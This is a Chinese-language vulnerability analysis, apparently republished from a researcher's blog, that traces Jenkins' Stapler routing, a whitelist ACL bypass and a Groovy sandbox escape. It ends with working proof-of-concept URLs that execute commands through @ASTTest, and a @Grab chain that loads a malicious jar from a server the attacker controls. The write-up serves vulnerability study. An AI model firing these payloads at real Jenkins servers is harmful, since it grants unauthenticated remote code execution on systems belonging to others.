**作者：Lucifaer  
博客：<https://www.lucifaer.com>**

### 0x01 Jenkins的动态路由解析

`web.xml`：

![](https://images.seebug.org/content/images/2019/03/06/1551855386000-15508232678628.jpg-w331s)

可以看到Jenkins将所有的请求交给`org.kohsuke.stapler.Stapler`来处理的，跟进看一下这个类中的`service`方法：

![](https://images.seebug.org/content/images/2019/03/06/1551855387000-15510912657193.jpg-w331s)

![](https://images.seebug.org/content/images/2019/03/06/1551855387000-15508242301079.jpg-w331s)

可以看到这里会根据url来调用不同的webApp，如果url以`/$stapler/bound/`开头，则根节点对象为`org.kohsuke.stapler.bind.BoundObjectTable`，否则为`hudson.model.Hudson`（继承jenkins.model.Jenkins）。

这里涉及到四个参数：

  * req：请求对象
  * rsp：响应对象
  * root：webApp（根节点）
  * servletPath：经过路由解析后的对象

继续向下跟：

![](https://images.seebug.org/content/images/2019/03/06/1551855387000-15508271723386.jpg-w331s)

![](https://images.seebug.org/content/images/2019/03/06/1551855387000-15510915150703.jpg-w331s)

在`org.kohsuke.stapler.Stapler#tryInvoke`中会根据不同的webApp的类型对请求进行相应的处理，处理的优先级顺序向下：

  * StaplerProxy
  * StaplerOverridable
  * StaplerFallback

在`tryInvoke`中完成对路由的分派以及将路由与相应的功能进行绑定的操作，这里面比较复杂，但是非常有意思。

我们来看一下文档中是如何介绍路由请求这部分操作的：

![](https://images.seebug.org/content/images/2019/03/06/1551855387000-15510593937933.jpg-w331s)

文档中详细的说明了当我们传入类似`/foo/bar/`这样的url时路由解析的具体做法，具体看一下`tryInvoke`中的代码实现：

![](https://images.seebug.org/content/images/2019/03/06/1551855387000-15511484361514.jpg-w331s)

这里首先会根据webApp（根节点）来获取webApp的一个MetaClass对象，然后轮询MetaClass中所有的分派器——也就是Dispatcher.dispatcher。我们这里知道webApp是`hudson.model.Hudson`（继承jenkins.model.Jenkins），也就是说这里创建了MetaClass后会将请求包带入所有的分派器中进行相应的路由处理。

那么接下来就会有两个问题了：

  * metaClass是如何构造的？还有metaClass是个什么东西？
  * 在哪里完成的如文档所说的递归进行路由解析并通过分派器进行相应处理的呢？

这个两个问题困扰我很长的时间，在我耐心的动态调了一遍之后才明白了他的调用原理。

#### metaClass的构建

这里我会用动态调试的方式来解释metaClass的构建过程以及它是一个什么东西。

这里我用根据orange文章中所给出的路由来进行跟踪，路由为`/securityRealm/user/test/`。那么首先看一下metaClass的构建过程：

![](https://images.seebug.org/content/images/2019/03/06/1551855387000-15511629693475.jpg-w331s)

这里有两个关键点`getMetaClass`以及`getKlass`，首先跟进`getKlass`看一下:

![](https://images.seebug.org/content/images/2019/03/06/1551855387000-15511630759036.jpg-w331s)

首先先判别我们传进来的node（也就是节点）是否是属于上面三个Facet的一个配置项，关于Facet我的理解是用于简化项目配置项的一种操作，它并不属于J2EE的部分，这部分我是参考<https://stackoverflow.com/questions/1809918/what-is-facet-in-javaee>。跟进`f.getKlass`，会发现直接返回null，所以我们不用关注这个循环，继续向下看`Klass.java(o.getClass())`：

![](https://images.seebug.org/content/images/2019/03/06/1551855388000-15511638405454.jpg-w331s)

这里动态的实例化了`KlassNavigator.JAVA`，这里的Klass其实是一个动态实例化的对象，这个对象中存在很多方法用于操作，同时也实例化了`Klass`类。可能现在还是看不出来什么和metaClass有关的东西，那不妨接着看看`getMetaClass`中是怎么处理这个`Klass`的。

![](https://images.seebug.org/content/images/2019/03/06/1551855388000-15511642536434.jpg-w331s)

跟进`MetaClass`：

![](https://images.seebug.org/content/images/2019/03/06/1551855388000-15511656316649.jpg-w331s)

在这里首先通过之前实例化的`Klass`对象中的方法来获取node节点的信息，并调用`buildDispatchers()`来创建分派器，这个方法是url调度的核心。

这个方法非常的长，我们来梳理一下（其实orange已经帮助我们梳理了），我是按照代码中自上而下的顺序来整理的：

  * `<obj>.do<token>(...)`也就是`do(...)`和`@WebMethod`标注的方法
  * `<obj>.doIndex(...)`
  * `<obj>js<token>`也就是`js(...)`
  * 有`@JavaScriptMethod`标注的方法
  * `NODE.getTOKEN()`也就是`get()`
  * `NODE.getTOKEN(StaplerRequest)`也就是`get(StaplerRequest)`
  * `<obj>.get<Token>(String)`也就是`get(String)`
  * `<obj>.get<Token>(int)`也就是`get(int)`
  * `<obj>.get<Token>(long)`也就是`get(long)`
  * `<obj>.getDynamic(<token>,...)`也就是`getDynamic()`
  * `<obj>.doDynamic(...)`也就是`doDynamic()`

也就是说符合以上命名规则的方法都可以被调用。

`buildDispatchers()`的主要作用就是寻找对应的node节点与相应的处理方法（继承家族树中的所有类）并把这个方法加入到分配器dispatchers中。而这里所说的这个方法可能是对节点的进一步处理最后通过反射的方法调用真实处理该节点的方法。

举一个例子，在代码中可以看到在对`get(...)`类的node进行处理的时候都会动态生成一个`NameBasedDispatcher`对象并将其添加进入dispathers中，而这个对象都存在`doDispatch()`的方法用于处理分派器传来的请求，而在处理请求的最后都会调用`invoke`来反射调用真实处理方法：

![](https://images.seebug.org/content/images/2019/03/06/1551855388000-15511687918250.jpg-w331s)

这里先记一下这样的处理过程，在之后的分派器处理路由请求时会有涉及。

#### 路由请求处理过程

仍然是以上面`/securityRealm/user/test/`路由为例。首先不看代码，先根据文档中所描述的处理方式大致猜一下这一串路由是如何解析的：

    
    
    -> node: Hudson
      -> node: securityRealm
        -> node: user
          -> node: test

回到`tryInvoke`中我们来具体看一下在代码中是怎么做的：

![](https://images.seebug.org/content/images/2019/03/06/1551855388000-15511718645324.jpg-w331s)

注意到这里会有一个遍历`metaClass.dispatchers`的操作，然后在每次遍历的过程中，将请求、返回以及node节点传入`Dispatcher.dispatch`中，跟一下这个`dispatch`：

![](https://images.seebug.org/content/images/2019/03/06/1551855388000-15511724916056.jpg-w331s)

这个是一个抽象类，那么他的具体实现是什么呢，还记得上一节所探讨的metaClass中对get请求的处理么，它们都会动态的生成一个`NameBasedDispatcher`对象，而我们现在的处理过程中就会调用到这个对象中的`dispatch`方法，我们来看一下：

![](https://images.seebug.org/content/images/2019/03/06/1551855388000-15511729433360.jpg-w331s)

注意看红框的部分，这里会获取请求的node节点，并调用其具体实现中的`doDispatch`方法，而这个`doDispatch`方法是在`buildDispatchers()`中根据不同的node节点动态生成的，那么也就是调用了处理`get(...)`的`doDispatch`：

![](https://images.seebug.org/content/images/2019/03/06/1551855388000-15511730690363.jpg-w331s)

这里我们有一个疑惑，第一个节点已经ok了，那么如何递归的解析其他的节点呢？这一点需要跟一下`req.getStapler().invoke()`，先看一下`getStapler()`：

![](https://images.seebug.org/content/images/2019/03/06/1551855389000-15511758590085.jpg-w331s)

就是当前的Stapler。这里的ff是一个`org.kohsuke.stapler.Function`对象，它保存了当前根节点中方法的各种信息：

![](https://images.seebug.org/content/images/2019/03/06/1551855389000-15511772450427.jpg-w331s)

ff.invoke会返回`Hudson.security.HudsonPrivateSecurityRealm`对象：

![](https://images.seebug.org/content/images/2019/03/06/1551855389000-15511773288120.jpg-w331s)

然后将这个`HudsonPrivateSecurityRealm`对象作为新的根节点再次调用`tryInvoke`来进行解析，一直递归到将url全部解析完毕，这样才完成了动态路由解析。

### 0x02 Jenkins白名单路由

在跟踪Jenkins的动态路由解析中，一直没有提及一个过程，就是在`org.kohsuke.stapler.Stapler#tryInvoke`中首先对属于`StaplerProxy`的node进行的一个校验：

![](https://images.seebug.org/content/images/2019/03/06/1551855389000-15511778879492.jpg-w331s)

跟进看一下：

![](https://images.seebug.org/content/images/2019/03/06/1551855390000-15510781474963.jpg-w331s)

这里首先要进行权限检查，首先检查访问请求是否具有读的权限，如果没有读的权限则会抛出异常，在异常处理中会对URL进行二次检测，如果`isSubjectToMandatoryReadPermissionCheck`返回false，则仍能正常的返回，那么跟进看一下这个方法：

![](https://images.seebug.org/content/images/2019/03/06/1551855390000-15510785640165.jpg-w331s)

这里有三种方法绕过权限检查，这里着重看一下第一种，可以看到这里有一个白名单，如果请求的路径是这其中的路径的话，就可以绕过权限检测：

![](https://images.seebug.org/content/images/2019/03/06/1551855390000-15510836928487.jpg-w331s)

### 0x03 绕过ACL进行跨物件操作

这也是orange文章中最为精华的部分，主要是有三个关键点：

  * Java中万物皆继承于java.lang.Object，所以所有在Java中的类都存在`getClass()`这个方法
  * Jenkins的动态路由解析过程也是一个`get(...)`的命名格式，所以`getClass()`可以在Jenkins调用链中被动态调用。
  * 上文中所说的白名单可以绕过ACL的检测

重点说一下第二点，根据文档以及我们上文的分析，如果有这么一个路由：

    
    
    http://jenkin.local/adjuncts/whatever/class/classLoader/resource/index.jsp/content

那么在Jenkins的路由解析过程中会是这样的过程：

    
    
    jenkins.model.Jenkins.getAdjuncts("whatever") 
    .getClass()
    .getClassLoader()
    .getResource("index.jsp")
    .getContent()

当例子中的class更改成其他的类时，get(...)也会被相应的调用，也就是说可以操作任意的GETTER方法！

理解了这一点，我们只需要把调用链中各个物件间的关系找出来就能构成一条完整的利用链！这一点才是整个漏洞中最精彩的一部分。

### 0x04 整理漏洞利用链

在利用orange文章中给出的跳板url进行跟踪的过程中，我一直试图去理解为什么要这样的构造，而并不是直接拿来这个url进行动态调。下面我将尝试去解释如何一步步发现以及一步步的构造这个跳板。

在0x02中我们已经分析了可以利用三种白名单中的路由格式来绕过权限检查，这里我们利用`securityRealm`来构造利用链。

#### securityRealm中可用的利用链

我们看一下`securityRealm`对应的metaClass中有什么可以用的：

![](https://images.seebug.org/content/images/2019/03/06/1551855390000-15513255436337.jpg-w331s)

可以看到总共可用的有30个之多，而真正可以控制的利用链只有`hudson.security.HudsonPrivateSecurityRealm.getUser(String)`。

>
> 如果仔细阅读了文档，可以很容易根据方法名来理解这个方法主要是干什么的，比如get(...)[token]这样的，就说明他会根据路由解析策略来解析之后的参数，如果说是do(...)这样的，证明会执行相应的方法。

那么也就说我们之后的操作需要基于`getUser`这个方法。根据路由解析策略，我们现在构造这样的url来进一步动态看一下在`User`对应的metaClass中有什么可以利用的。

#### 突破习惯性思维

我们这此将url更改为：

    
    
    /securityRealm/user/admin

看一下metaClass中的内容，发现都是`User`这个类中的方法，好像没有什么能用的东西，好像这个思路不可行了，那么这个时候能不能继续利用路由的解析特点来调用其他的类中的方法呢？可以的。

这个时候就要说一下在每个节点加载时候存在的一个问题，这部分是我自己的猜测可能有错误，希望大家指正。

根据0x01中的分析，我们都知道第一个根节点为`hudson.model.Hudson`，而`Hudson`又是继承于`Jenkins`的，所以他会将hudson和jenkins包下的model中所有的类全部都加载进metaClass中，从动态调试中我们也能看得出来：

![](https://images.seebug.org/content/images/2019/03/06/1551855390000-15513410174776.jpg-w331s)

那么由于我们是需要利用`securityRealm`来绕过权限检测，那么这个时候下次处理的根节点为`hudson.security.HudsonPrivateSecurityRealm`，同样，这里也会加载`HudsonPrivateSecurityRealm`这个类下的所有方法，因为这里只有`getUser(String)`中的String是收我们控制并且能执行的一个方法，所以我们这里就可以调用到`hudson.model.User`类，此时路由解析会认为下一个节点是该方法的一个参数（token），在解析下一个节点时将其节点带入到`getUser()`方法中。在这里metaClass中是`User`这个类中的所有方法，但是在路由解析中认为下一个节点并不会是与`User`所相关的参数或方法。
**所以当我们在这里新传入一个不在metaClass中的方法时，他首先会在构建metaClass的过程中尝试找到这个未知的类及其继承树中的类，并将其加入到metaClass中。**
而这个添加的过程，就在`webApp.getMetaClass(node)`中：

![](https://images.seebug.org/content/images/2019/03/06/1551855390000-15513424120873.jpg-w331s)

所以我可以构造这么样一个url来调用`hudson.search.Search#doIndex`来进行查询：

    
    
    http://localhost:8080/jenkins_war_war/securityRealm/user/admin/search/index?q=a

![](https://images.seebug.org/content/images/2019/03/06/1551855391000-15513425180676.jpg-w331s)

同样我也可以尝试调用`hudson.model.Api#doJson`：

    
    
    http://localhost:8080/jenkins_war_war/securityRealm/user/admin/api/json

![](https://images.seebug.org/content/images/2019/03/06/1551855391000-15513427110206.jpg-w331s)

这么顺着想当然没有问题，但是我在分析的时候又有一个想法，如果说我不加`user/admin`也就是说不调用`User`能不能直接加载`api/json`来查看信息呢？

![](https://images.seebug.org/content/images/2019/03/06/1551855391000-15513432188343.jpg-w331s)

不行，为什么呢？同样的问题也出现在调用`search/index`中。

#### 理解metaClass的加载机制

这个问题其实是一个比较钻牛角尖的问题，以及对`metaClass`加载方式不完全了解的问题。我们来看一下`User`的继承树关系图:

![](https://images.seebug.org/content/images/2019/03/06/1551855391000-15514220055697.jpg-w331s)

`User`类是直接继承于`AbstractModelObject`这个抽象类的，而`AbstractModelObject`是`SearchableModelObject`这个接口的实现，这是一条完整的继承树关系。我们来首先看一下`SearchableModelObject`这个接口：

![](https://images.seebug.org/content/images/2019/03/06/1551855391000-15514223563638.jpg-w331s)

在接口这里声明了一个`getSearch()`方法，也就是说当节点为`User`类时，在metaClass寻找的过程中是可以通过继承树关系来找到`getSearch()`方法的，接下来看一下具体的实现:

![](https://images.seebug.org/content/images/2019/03/06/1551855391000-15514224780226.jpg-w331s)

这里会返回一个`Search`对象，然后这个对象中的所有方法都会被添加进入metaClass中，并通过`buildDispatchers()`来完成分派器的生成，然后就是正常的路由解析过程。

而在`HudsonPrivateSecurityRealm`的继承树关系中是没有这一层关系的：

![](https://images.seebug.org/content/images/2019/03/06/1551855391000-15514229289294.jpg-w331s)

所以`search/index`是没办法被找到的。

#### 思考

现在我们理清楚了未什么跳板url需要这样构造，说实话，调用到`User`这个类其实就是完成了一个作用域的调转，从原来的限制比较死的作用域跳转到一个更加广阔的作用域中了。

那么现在问题来了，rce的利用链到底在哪里？

我们重新看看在`User`节点中还有什么是可以利用的：

![](https://images.seebug.org/content/images/2019/03/06/1551855391000-15514231583982.jpg-w331s)

这里好像可以调用`ModelObject`中的东西，那么先来分析一下`DescriptorByNameOwner`这个接口：

![](https://images.seebug.org/content/images/2019/03/06/1551855391000-15514232501037.jpg-w331s)

![](https://images.seebug.org/content/images/2019/03/06/1551855391000-15514248777003.jpg-w331s)

可以看到就是通过id来获取相应的Descriptor，也就是说接下来去寻找可用的Descriptor就行了。这里下个断点就能看到582个可调用的Descriptor了。

### 0x05 Groovy沙盒绕过最终导致的rce

Jenkins 2019-01-08的安全通告中包含了Groovy沙箱绕过的问题：

![](https://images.seebug.org/content/images/2019/03/06/1551855391000-15514256864031.jpg-w331s)

其实最后可利用的点并非这么几条路，但是其原理都是差不多的，这里用Script Security这个插件作为例子来分析。

![](https://images.seebug.org/content/images/2019/03/06/1551855391000-15516698690607.jpg-w331s)

在`org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript#DescriptorImpl`中我们首先可以看到这个`DescriptorImpl`是继承于`Descriptor`的，也就是说我们上面的调用链可以访问到该方法；同时在这个方法中存在一个`doCheckScript`的方法，根据前面的分析，我们知道这个方法也是可以被我们利用的，并且这个方法的value是我们可控的，在这里完成的对value这个Groovy表达式的解析。

这里只是解析了Grovvy表达式，那么它是否执行了呢？这里我们先不讨论是否执行了，我们来试一试公告中的沙箱绕过方式是怎么做的。

#### 方法一：@ASTTest中执行assertions

首先在本地试一下`@ASTTest`中是否能执行断言，执行的断言是否能执行代码：

![](https://images.seebug.org/content/images/2019/03/06/1551855392000-15516819287527.jpg-w331s)

然后试一下这个poc：

    
    
    http://localhost:8080/jenkins_war_war/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=import+groovy.transform.*%0a
    %40ASTTest(value%3d%7bassert+java.lang.Runtime.getRuntime().exec(%22open+%2fApplications%2fCalculator.app%22)%7d)%0a
    class+Person%7b%7d

![](https://images.seebug.org/content/images/2019/03/06/1551855392000-15516837235401.jpg-w331s)

成功执行代码。

这里的执行命令的方式可以换成groovy形式的执行方法:

    
    
    http://localhost:8080/jenkins_war_war/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=import+groovy.transform.*%0a
    %40ASTTest(value%3d%7b+%22open+%2fApplications%2fCalculator.app%22.execute().text+%7d)%0a
    class+Person%7b%7d

![](https://images.seebug.org/content/images/2019/03/06/1551855392000-15516859748705.jpg-w331s)

#### 方法二：@Grab引入外部的危险类

`Grape`是groovy内置的依赖管理引擎，具体的说明在[官方文档](http://docs.groovy-lang.org/latest/html/documentation/grape.html)中，可以仔细阅读。

在阅读`Grape`文档时，关于引入其他存储库这部分的操作是非常令人感兴趣的:

![](https://images.seebug.org/content/images/2019/03/06/1551855392000-15516864448500.jpg-w331s)

如果这里的root是可以指向我们控制的服务器，引入我们已经构造好的恶意的文件呢？有点像JNDI注入了吧。

本地写个demo试一下:

![](https://images.seebug.org/content/images/2019/03/06/1551855392000-15516872081851.jpg-w331s)

那么按照这个模式来构造，这里参考Orange第二篇文章或[这篇利用文章](https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html)，我的执行流程如下:

    
    
    javac Exp.java
    mkdir -p META-INF/services/
    echo Exp > META-INF/services/org.codehaus.groovy.plugins.Runners
    jar cvf poc-2.jar Exp.class META-INF
    mkdir -p ./demo_server/exp/poc/2/
    mv poc-2.jar demo_server/exp/poc/2/

然后构造如下的请求：

    
    
    http://localhost:8080/jenkins_war_war/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=@GrabConfig(disableChecksums=true)%0a
    @GrabResolver(name='Exp', root='http://127.0.0.1:9999/')%0a
    @Grab(group='demo_server.exp', module='poc', version='2')%0a
    import Exp;

![](https://images.seebug.org/content/images/2019/03/06/1551855392000-15516896230268.jpg-w331s)

### 0x06 总结

Orange这个洞真的是非常精彩，从动态路由入手，再到Pipeline这里groovy表达式解析，真的是一环扣一环，在这里我用正向跟进的方法将整个漏洞梳理了一遍，梳理前是非常迷惑的，梳理后恍然大悟，越品越觉得精彩。Orange
Tql。

T T

### 0x07 Reference

  * <https://stackoverflow.com/questions/1809918/what-is-facet-in-javaee>
  * <http://docs.groovy-lang.org/latest/html/documentation/grape.html>
  * <https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html>
  * <https://jenkins.io/security/advisories/>
  * <https://jenkins.io/doc/developer/book/>
  * <https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/>
  * <https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/836/>

